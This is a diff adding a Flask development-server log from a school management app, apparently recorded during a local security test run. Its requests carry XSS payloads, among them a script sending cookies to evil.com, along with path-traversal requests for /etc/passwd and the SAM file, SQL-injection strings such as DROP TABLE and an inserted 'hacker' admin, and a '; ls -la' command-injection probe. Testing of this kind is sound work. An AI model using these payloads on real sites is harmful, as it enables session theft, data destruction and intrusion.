@@ -1,1 +1,206 @@
 
+2025-07-13 16:56:58,982 - new_structure - INFO - Application logging configured
+2025-07-13 16:57:00,296 - mark_validation - INFO - Mark sanitizer middleware initialized
+2025-07-13 16:57:00,311 - new_structure - INFO - Application initialized
+2025-07-13 16:57:00,375 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.0.102:5000
+2025-07-13 16:57:00,375 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
+2025-07-13 16:57:00,378 - werkzeug - INFO -  * Restarting with stat
+2025-07-13 16:57:01,988 - new_structure - INFO - Application logging configured
+2025-07-13 16:57:03,405 - mark_validation - INFO - Mark sanitizer middleware initialized
+2025-07-13 16:57:03,420 - new_structure - INFO - Application initialized
+2025-07-13 16:57:03,449 - werkzeug - WARNING -  * Debugger is active!
+2025-07-13 16:57:03,459 - werkzeug - INFO -  * Debugger PIN: 267-181-210
+2025-07-13 16:57:49,546 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 16:57:49] "GET / HTTP/1.1" 200 -
+2025-07-13 16:58:32,884 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 16:58:32] "GET / HTTP/1.1" 200 -
+2025-07-13 16:58:35,201 - new_structure.services.auth_service - INFO - Authentication successful for headteacher with role headteacher
+2025-07-13 16:58:35,204 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 16:58:35] "[32mPOST /admin_login HTTP/1.1[0m" 302 -
+2025-07-13 16:58:37,275 - new_structure.services.auth_service - WARNING - Authentication failed for invalid_user with role headteacher
+2025-07-13 16:58:37,295 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 16:58:37] "POST /admin_login HTTP/1.1" 200 -
+2025-07-13 16:58:39,344 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 16:58:39] "[31m[1mPOST /admin_login HTTP/1.1[0m" 400 -
+2025-07-13 16:58:41,399 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 16:58:41] "[31m[1mPOST /admin_login HTTP/1.1[0m" 400 -
+2025-07-13 16:58:43,435 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 16:58:43] "[31m[1mPOST /admin_login HTTP/1.1[0m" 400 -
+2025-07-13 16:58:45,498 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 16:58:45] "GET / HTTP/1.1" 200 -
+2025-07-13 16:58:47,764 - new_structure.services.auth_service - INFO - Authentication successful for headteacher with role headteacher
+2025-07-13 16:58:47,767 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 16:58:47] "[32mPOST /admin_login HTTP/1.1[0m" 302 -
+2025-07-13 16:58:49,964 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 16:58:49] "GET /headteacher/ HTTP/1.1" 200 -
+2025-07-13 16:58:51,989 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 16:58:51] "[32mGET /headteacher/ HTTP/1.1[0m" 302 -
+2025-07-13 16:58:54,027 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 16:58:54] "[32mGET /classteacher/ HTTP/1.1[0m" 302 -
+2025-07-13 16:58:56,096 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 16:58:56] "[32mGET /teacher/ HTTP/1.1[0m" 302 -
+2025-07-13 16:58:58,143 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 16:58:58] "[33mGET /manage_students HTTP/1.1[0m" 404 -
+2025-07-13 16:59:00,195 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 16:59:00] "[33mGET /manage_teachers HTTP/1.1[0m" 404 -
+2025-07-13 16:59:02,365 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 16:59:02] "GET /headteacher/ HTTP/1.1" 200 -
+2025-07-13 16:59:04,684 - new_structure.services.auth_service - INFO - Authentication successful for headteacher with role headteacher
+2025-07-13 16:59:04,688 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 16:59:04] "[32mPOST /admin_login HTTP/1.1[0m" 302 -
+2025-07-13 16:59:06,858 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 16:59:06] "GET /headteacher/ HTTP/1.1" 200 -
+2025-07-13 16:59:08,899 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 16:59:08] "[31m[1mGET /manage_students?search=<script>alert('XSS')</script> HTTP/1.1[0m" 400 -
+2025-07-13 16:59:10,936 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 16:59:10] "[31m[1mGET /manage_students?search=javascript:alert('XSS') HTTP/1.1[0m" 400 -
+2025-07-13 16:59:12,988 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 16:59:12] "[33mGET /manage_students?search=<img+src%3Dx+onerror%3Dalert('XSS')> HTTP/1.1[0m" 404 -
+2025-07-13 16:59:15,049 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 16:59:15] "[33mGET /manage_students?search=';alert('XSS');// HTTP/1.1[0m" 404 -
+2025-07-13 16:59:17,111 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 16:59:17] "[31m[1mGET /etc/passwd HTTP/1.1[0m" 403 -
+2025-07-13 16:59:19,155 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 16:59:19] "[31m[1mGET /static/..\\..\\..\\windows\\system32\\config\\sam HTTP/1.1[0m" 403 -
+2025-07-13 16:59:21,211 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 16:59:21] "[31m[1mGET /static/..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1[0m" 403 -
+2025-07-13 16:59:23,241 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 16:59:23] "[31m[1mGET /static/....//....//....//etc/passwd HTTP/1.1[0m" 403 -
+2025-07-13 16:59:25,531 - new_structure.services.auth_service - INFO - Authentication successful for headteacher with role headteacher
+2025-07-13 16:59:25,534 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 16:59:25] "[32mPOST /admin_login HTTP/1.1[0m" 302 -
+2025-07-13 16:59:27,698 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 16:59:27] "GET /headteacher/ HTTP/1.1" 200 -
+2025-07-13 16:59:29,733 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 16:59:29] "[33mGET /manage_students HTTP/1.1[0m" 404 -
+2025-07-13 16:59:31,777 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 16:59:31] "[33mPOST /manage_students HTTP/1.1[0m" 404 -
+2025-07-13 17:01:23,468 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:01:23] "GET / HTTP/1.1" 200 -
+2025-07-13 17:01:25,819 - new_structure.services.auth_service - INFO - Authentication successful for headteacher with role headteacher
+2025-07-13 17:01:25,822 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:01:25] "[32mPOST /admin_login HTTP/1.1[0m" 302 -
+2025-07-13 17:01:28,020 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:01:28] "GET /headteacher/ HTTP/1.1" 200 -
+2025-07-13 17:01:30,208 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:01:30] "GET /headteacher/ HTTP/1.1" 200 -
+2025-07-13 17:01:32,272 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:01:32] "[33mGET /admin/ HTTP/1.1[0m" 404 -
+2025-07-13 17:01:34,321 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:01:34] "[33mGET /universal/ HTTP/1.1[0m" 404 -
+2025-07-13 17:01:36,354 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:01:36] "[33mGET /manage_teachers HTTP/1.1[0m" 404 -
+2025-07-13 17:01:38,397 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:01:38] "[33mGET /manage_students HTTP/1.1[0m" 404 -
+2025-07-13 17:01:40,427 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:01:40] "[33mGET /manage_subjects HTTP/1.1[0m" 404 -
+2025-07-13 17:01:42,472 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:01:42] "[33mGET /analytics HTTP/1.1[0m" 404 -
+2025-07-13 17:01:44,603 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:01:44] "GET /school-setup/ HTTP/1.1" 200 -
+2025-07-13 17:01:46,649 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:01:46] "[33mGET /permission/ HTTP/1.1[0m" 404 -
+2025-07-13 17:01:48,684 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:01:48] "[33mGET /staff/ HTTP/1.1[0m" 404 -
+2025-07-13 17:01:50,726 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:01:50] "[33mGET /bulk_assignments/ HTTP/1.1[0m" 404 -
+2025-07-13 17:01:52,789 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:01:52] "GET / HTTP/1.1" 200 -
+2025-07-13 17:01:54,872 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:01:54] "GET /admin_login HTTP/1.1" 200 -
+2025-07-13 17:01:56,951 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:01:56] "GET /teacher_login HTTP/1.1" 200 -
+2025-07-13 17:01:59,032 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:01:59] "GET /classteacher_login HTTP/1.1" 200 -
+2025-07-13 17:02:01,099 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:02:01] "[33mGET /static/ HTTP/1.1[0m" 404 -
+2025-07-13 17:02:03,165 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:02:03] "GET /health HTTP/1.1" 200 -
+2025-07-13 17:02:05,219 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:02:05] "[32mGET /headteacher/ HTTP/1.1[0m" 302 -
+2025-07-13 17:02:07,268 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:02:07] "[32mGET /classteacher/ HTTP/1.1[0m" 302 -
+2025-07-13 17:02:09,342 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:02:09] "[32mGET /teacher/ HTTP/1.1[0m" 302 -
+2025-07-13 17:02:11,416 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:02:11] "[33mGET /manage_students HTTP/1.1[0m" 404 -
+2025-07-13 17:02:13,450 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:02:13] "[33mGET /manage_teachers HTTP/1.1[0m" 404 -
+2025-07-13 17:02:15,510 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:02:15] "[33mGET /analytics HTTP/1.1[0m" 404 -
+2025-07-13 17:02:17,862 - new_structure.services.auth_service - INFO - Authentication successful for headteacher with role headteacher
+2025-07-13 17:02:17,866 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:02:17] "[32mPOST /admin_login HTTP/1.1[0m" 302 -
+2025-07-13 17:02:20,042 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:02:20] "GET /headteacher/ HTTP/1.1" 200 -
+2025-07-13 17:02:22,203 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:02:22] "GET /headteacher/?role=admin HTTP/1.1" 200 -
+2025-07-13 17:02:24,363 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:02:24] "GET /headteacher/?user_role=headteacher HTTP/1.1" 200 -
+2025-07-13 17:02:26,558 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:02:26] "GET /headteacher/?access_level=999 HTTP/1.1" 200 -
+2025-07-13 17:02:28,753 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:02:28] "GET /headteacher/?is_admin=true HTTP/1.1" 200 -
+2025-07-13 17:02:30,988 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:02:30] "GET /headteacher/?permissions=all HTTP/1.1" 200 -
+2025-07-13 17:02:33,034 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:02:33] "[33mPOST /manage_teachers HTTP/1.1[0m" 404 -
+2025-07-13 17:02:35,352 - new_structure.services.auth_service - INFO - Authentication successful for headteacher with role headteacher
+2025-07-13 17:02:35,356 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:02:35] "[32mPOST /admin_login HTTP/1.1[0m" 302 -
+2025-07-13 17:02:37,548 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:02:37] "GET /headteacher/ HTTP/1.1" 200 -
+2025-07-13 17:02:39,604 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:02:39] "[33mGET /student/1 HTTP/1.1[0m" 404 -
+2025-07-13 17:02:41,651 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:02:41] "[33mGET /student/99999 HTTP/1.1[0m" 404 -
+2025-07-13 17:02:43,680 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:02:43] "[33mGET /teacher/1 HTTP/1.1[0m" 404 -
+2025-07-13 17:02:45,731 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:02:45] "[33mGET /teacher/99999 HTTP/1.1[0m" 404 -
+2025-07-13 17:02:47,791 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:02:47] "[33mGET /grade/1 HTTP/1.1[0m" 404 -
+2025-07-13 17:02:49,834 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:02:49] "[33mGET /grade/99999 HTTP/1.1[0m" 404 -
+2025-07-13 17:02:51,882 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:02:51] "[33mGET /stream/1 HTTP/1.1[0m" 404 -
+2025-07-13 17:02:53,927 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:02:53] "[33mGET /stream/99999 HTTP/1.1[0m" 404 -
+2025-07-13 17:05:01,030 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:05:01] "GET / HTTP/1.1" 200 -
+2025-07-13 17:05:03,327 - new_structure.services.auth_service - INFO - Authentication successful for headteacher with role headteacher
+2025-07-13 17:05:03,330 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:05:03] "[32mPOST /admin_login HTTP/1.1[0m" 302 -
+2025-07-13 17:05:05,509 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:05:05] "GET /headteacher/ HTTP/1.1" 200 -
+2025-07-13 17:05:07,559 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:05:07] "[31m[1mPOST /admin_login HTTP/1.1[0m" 400 -
+2025-07-13 17:05:09,633 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:05:09] "[31m[1mPOST /admin_login HTTP/1.1[0m" 400 -
+2025-07-13 17:05:11,678 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:05:11] "[31m[1mPOST /admin_login HTTP/1.1[0m" 400 -
+2025-07-13 17:05:13,720 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:05:13] "[31m[1mPOST /admin_login HTTP/1.1[0m" 400 -
+2025-07-13 17:05:15,767 - new_structure.services.auth_service - WARNING - Authentication failed for ' OR 1=1 -- with role headteacher
+2025-07-13 17:05:15,783 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:05:15] "POST /admin_login HTTP/1.1" 200 -
+2025-07-13 17:05:17,839 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:05:17] "[31m[1mPOST /admin_login HTTP/1.1[0m" 400 -
+2025-07-13 17:05:19,891 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:05:19] "[31m[1mPOST /admin_login HTTP/1.1[0m" 400 -
+2025-07-13 17:05:21,948 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:05:21] "[31m[1mPOST /admin_login HTTP/1.1[0m" 400 -
+2025-07-13 17:05:23,990 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:05:23] "[31m[1mPOST /admin_login HTTP/1.1[0m" 400 -
+2025-07-13 17:05:26,045 - new_structure.services.auth_service - WARNING - Authentication failed for ' AND (SELECT COUNT(*) FROM teacher) > 0 -- with role headteacher
+2025-07-13 17:05:26,061 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:05:26] "POST /admin_login HTTP/1.1" 200 -
+2025-07-13 17:05:28,108 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:05:28] "[31m[1mGET /manage_students?search='+OR+'1'%3D'1 HTTP/1.1[0m" 400 -
+2025-07-13 17:05:30,161 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:05:30] "[31m[1mGET /manage_students?search=';+DROP+TABLE+teacher;+-- HTTP/1.1[0m" 400 -
+2025-07-13 17:05:32,198 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:05:32] "[31m[1mGET /manage_students?search='+UNION+SELECT+*+FROM+teacher+-- HTTP/1.1[0m" 400 -
+2025-07-13 17:05:34,254 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:05:34] "[31m[1mGET /manage_students?search=admin';+INSERT+INTO+teacher+VALUES+('hacker',+'password',+'admin');+-- HTTP/1.1[0m" 400 -
+2025-07-13 17:05:36,284 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:05:36] "[33mGET /manage_students?search='+OR+1%3D1+-- HTTP/1.1[0m" 404 -
+2025-07-13 17:05:38,342 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:05:38] "[31m[1mGET /manage_teachers?search='+OR+'1'%3D'1 HTTP/1.1[0m" 400 -
+2025-07-13 17:05:40,376 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:05:40] "[31m[1mGET /manage_teachers?search=';+DROP+TABLE+teacher;+-- HTTP/1.1[0m" 400 -
+2025-07-13 17:05:42,433 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:05:42] "[31m[1mGET /manage_teachers?search='+UNION+SELECT+*+FROM+teacher+-- HTTP/1.1[0m" 400 -
+2025-07-13 17:05:44,467 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:05:44] "[31m[1mGET /manage_teachers?search=admin';+INSERT+INTO+teacher+VALUES+('hacker',+'password',+'admin');+-- HTTP/1.1[0m" 400 -
+2025-07-13 17:05:46,505 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:05:46] "[33mGET /manage_teachers?search='+OR+1%3D1+-- HTTP/1.1[0m" 404 -
+2025-07-13 17:05:48,568 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:05:48] "[31m[1mGET /headteacher/?search='+OR+'1'%3D'1 HTTP/1.1[0m" 400 -
+2025-07-13 17:05:50,624 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:05:50] "[31m[1mGET /headteacher/?search=';+DROP+TABLE+teacher;+-- HTTP/1.1[0m" 400 -
+2025-07-13 17:05:52,677 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:05:52] "[31m[1mGET /headteacher/?search='+UNION+SELECT+*+FROM+teacher+-- HTTP/1.1[0m" 400 -
+2025-07-13 17:05:54,718 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:05:54] "[31m[1mGET /headteacher/?search=admin';+INSERT+INTO+teacher+VALUES+('hacker',+'password',+'admin');+-- HTTP/1.1[0m" 400 -
+2025-07-13 17:05:56,893 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:05:56] "GET /headteacher/?search='+OR+1%3D1+-- HTTP/1.1" 200 -
+2025-07-13 17:05:58,979 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:05:58] "[31m[1mGET /manage_students?search=<script>alert('XSS')</script>&q=<script>alert('XSS')</script> HTTP/1.1[0m" 400 -
+2025-07-13 17:06:01,035 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:06:01] "[33mGET /manage_students?search=<img+src%3Dx+onerror%3Dalert('XSS')>&q=<img+src%3Dx+onerror%3Dalert('XSS')> HTTP/1.1[0m" 404 -
+2025-07-13 17:06:03,088 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:06:03] "[31m[1mGET /manage_students?search=javascript:alert('XSS')&q=javascript:alert('XSS') HTTP/1.1[0m" 400 -
+2025-07-13 17:06:05,141 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:06:05] "[33mGET /manage_students?search=<svg+onload%3Dalert('XSS')>&q=<svg+onload%3Dalert('XSS')> HTTP/1.1[0m" 404 -
+2025-07-13 17:06:07,188 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:06:07] "[33mGET /manage_students?search=';alert('XSS');//&q=';alert('XSS');// HTTP/1.1[0m" 404 -
+2025-07-13 17:06:09,218 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:06:09] "[31m[1mGET /manage_students?search=<iframe+src%3Djavascript:alert('XSS')></iframe>&q=<iframe+src%3Djavascript:alert('XSS')></iframe> HTTP/1.1[0m" 400 -
+2025-07-13 17:06:11,274 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:06:11] "[33mGET /manage_students?search=<body+onload%3Dalert('XSS')>&q=<body+onload%3Dalert('XSS')> HTTP/1.1[0m" 404 -
+2025-07-13 17:06:13,343 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:06:13] "[33mGET /manage_students?search=<input+onfocus%3Dalert('XSS')+autofocus>&q=<input+onfocus%3Dalert('XSS')+autofocus> HTTP/1.1[0m" 404 -
+2025-07-13 17:06:15,546 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:06:15] "[33mGET /manage_students?search=<select+onfocus%3Dalert('XSS')+autofocus>&q=<select+onfocus%3Dalert('XSS')+autofocus> HTTP/1.1[0m" 404 -
+2025-07-13 17:06:17,768 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:06:17] "[33mGET /manage_students?search=<textarea+onfocus%3Dalert('XSS')+autofocus>&q=<textarea+onfocus%3Dalert('XSS')+autofocus> HTTP/1.1[0m" 404 -
+2025-07-13 17:06:19,906 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:06:19] "[31m[1mGET /manage_students?search=<<SCRIPT>alert('XSS')</SCRIPT>&q=<<SCRIPT>alert('XSS')</SCRIPT> HTTP/1.1[0m" 400 -
+2025-07-13 17:06:21,939 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:06:21] "[31m[1mGET /manage_students?search=<script>document.location%3D'http://evil.com/steal.php?cookie%3D'%2Bdocument.cookie</script>&q=<script>document.location%3D'http://evil.com/steal.php?cookie%3D'%2Bdocument.cookie</script> HTTP/1.1[0m" 400 -
+2025-07-13 17:06:23,996 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:06:23] "[31m[1mGET /manage_teachers?search=<script>alert('XSS')</script>&q=<script>alert('XSS')</script> HTTP/1.1[0m" 400 -
+2025-07-13 17:06:26,040 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:06:26] "[33mGET /manage_teachers?search=<img+src%3Dx+onerror%3Dalert('XSS')>&q=<img+src%3Dx+onerror%3Dalert('XSS')> HTTP/1.1[0m" 404 -
+2025-07-13 17:06:28,075 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:06:28] "[31m[1mGET /manage_teachers?search=javascript:alert('XSS')&q=javascript:alert('XSS') HTTP/1.1[0m" 400 -
+2025-07-13 17:06:30,106 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:06:30] "[33mGET /manage_teachers?search=<svg+onload%3Dalert('XSS')>&q=<svg+onload%3Dalert('XSS')> HTTP/1.1[0m" 404 -
+2025-07-13 17:06:32,150 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:06:32] "[33mGET /manage_teachers?search=';alert('XSS');//&q=';alert('XSS');// HTTP/1.1[0m" 404 -
+2025-07-13 17:06:34,220 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:06:34] "[31m[1mGET /manage_teachers?search=<iframe+src%3Djavascript:alert('XSS')></iframe>&q=<iframe+src%3Djavascript:alert('XSS')></iframe> HTTP/1.1[0m" 400 -
+2025-07-13 17:06:36,264 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:06:36] "[33mGET /manage_teachers?search=<body+onload%3Dalert('XSS')>&q=<body+onload%3Dalert('XSS')> HTTP/1.1[0m" 404 -
+2025-07-13 17:06:38,298 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:06:38] "[33mGET /manage_teachers?search=<input+onfocus%3Dalert('XSS')+autofocus>&q=<input+onfocus%3Dalert('XSS')+autofocus> HTTP/1.1[0m" 404 -
+2025-07-13 17:06:40,335 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:06:40] "[33mGET /manage_teachers?search=<select+onfocus%3Dalert('XSS')+autofocus>&q=<select+onfocus%3Dalert('XSS')+autofocus> HTTP/1.1[0m" 404 -
+2025-07-13 17:06:42,392 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:06:42] "[33mGET /manage_teachers?search=<textarea+onfocus%3Dalert('XSS')+autofocus>&q=<textarea+onfocus%3Dalert('XSS')+autofocus> HTTP/1.1[0m" 404 -
+2025-07-13 17:06:44,467 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:06:44] "[31m[1mGET /manage_teachers?search=<<SCRIPT>alert('XSS')</SCRIPT>&q=<<SCRIPT>alert('XSS')</SCRIPT> HTTP/1.1[0m" 400 -
+2025-07-13 17:06:46,527 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:06:46] "[31m[1mGET /manage_teachers?search=<script>document.location%3D'http://evil.com/steal.php?cookie%3D'%2Bdocument.cookie</script>&q=<script>document.location%3D'http://evil.com/steal.php?cookie%3D'%2Bdocument.cookie</script> HTTP/1.1[0m" 400 -
+2025-07-13 17:06:48,590 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:06:48] "[31m[1mGET /headteacher/?search=<script>alert('XSS')</script>&q=<script>alert('XSS')</script> HTTP/1.1[0m" 400 -
+2025-07-13 17:06:50,750 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:06:50] "GET /headteacher/?search=<img+src%3Dx+onerror%3Dalert('XSS')>&q=<img+src%3Dx+onerror%3Dalert('XSS')> HTTP/1.1" 200 -
+2025-07-13 17:06:52,823 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:06:52] "[31m[1mGET /headteacher/?search=javascript:alert('XSS')&q=javascript:alert('XSS') HTTP/1.1[0m" 400 -
+2025-07-13 17:06:54,979 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:06:54] "GET /headteacher/?search=<svg+onload%3Dalert('XSS')>&q=<svg+onload%3Dalert('XSS')> HTTP/1.1" 200 -
+2025-07-13 17:06:57,146 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:06:57] "GET /headteacher/?search=';alert('XSS');//&q=';alert('XSS');// HTTP/1.1" 200 -
+2025-07-13 17:06:59,183 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:06:59] "[31m[1mGET /headteacher/?search=<iframe+src%3Djavascript:alert('XSS')></iframe>&q=<iframe+src%3Djavascript:alert('XSS')></iframe> HTTP/1.1[0m" 400 -
+2025-07-13 17:07:01,337 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:07:01] "GET /headteacher/?search=<body+onload%3Dalert('XSS')>&q=<body+onload%3Dalert('XSS')> HTTP/1.1" 200 -
+2025-07-13 17:07:03,503 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:07:03] "GET /headteacher/?search=<input+onfocus%3Dalert('XSS')+autofocus>&q=<input+onfocus%3Dalert('XSS')+autofocus> HTTP/1.1" 200 -
+2025-07-13 17:07:05,676 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:07:05] "GET /headteacher/?search=<select+onfocus%3Dalert('XSS')+autofocus>&q=<select+onfocus%3Dalert('XSS')+autofocus> HTTP/1.1" 200 -
+2025-07-13 17:07:07,869 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:07:07] "GET /headteacher/?search=<textarea+onfocus%3Dalert('XSS')+autofocus>&q=<textarea+onfocus%3Dalert('XSS')+autofocus> HTTP/1.1" 200 -
+2025-07-13 17:07:09,909 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:07:09] "[31m[1mGET /headteacher/?search=<<SCRIPT>alert('XSS')</SCRIPT>&q=<<SCRIPT>alert('XSS')</SCRIPT> HTTP/1.1[0m" 400 -
+2025-07-13 17:07:11,955 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:07:11] "[31m[1mGET /headteacher/?search=<script>document.location%3D'http://evil.com/steal.php?cookie%3D'%2Bdocument.cookie</script>&q=<script>document.location%3D'http://evil.com/steal.php?cookie%3D'%2Bdocument.cookie</script> HTTP/1.1[0m" 400 -
+2025-07-13 17:07:14,007 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:07:14] "[31m[1mPOST /manage_students HTTP/1.1[0m" 400 -
+2025-07-13 17:07:16,049 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:07:16] "[33mGET /manage_students?search=;+ls+-la HTTP/1.1[0m" 404 -
